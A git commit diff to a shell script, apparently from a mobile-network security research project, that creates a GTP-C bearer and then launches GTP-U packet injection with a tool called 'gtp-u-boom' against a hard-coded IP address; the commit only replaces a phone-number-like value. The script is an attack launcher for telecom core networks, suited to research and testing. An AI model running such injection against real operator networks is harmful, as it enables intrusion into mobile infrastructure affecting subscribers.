9f8a617eaab137372f9fd3633c665ce57a3cc445
Etienne <46919515+etienne-wg2@users.noreply.github.com>
2020-04-22 13:04:07 +0200

    Fixing typos in scripts (#3)
    * Adding script to create GTP-C bearer
    
    * Script and traces update
    
    * Typo

--- launch.sh
+++ launch.sh
@@ -3,7 +3,7 @@
 echo "What is the public IP ?"
 read SGW_IP
 echo -n "[+] Creating Bearer..."
-export $(python3 scripts/create_bearer.py 999990000000001 4790300125 loltel | grep -v "Session" | xargs -d '\n')
+export $(python3 scripts/create_bearer.py 999990000000001 1234567890 loltel | grep -v "Session" | xargs -d '\n')
 echo "ok"
 echo "[+] Starting GTP-U packets injection..."
 ./wg2/gtp-u-boom/gtp-u-boom -dst-ip 45.8.8.45 -src-ip $SGW_IP -teid $PGWU_TEID -data $GTPU_PAYLOAD
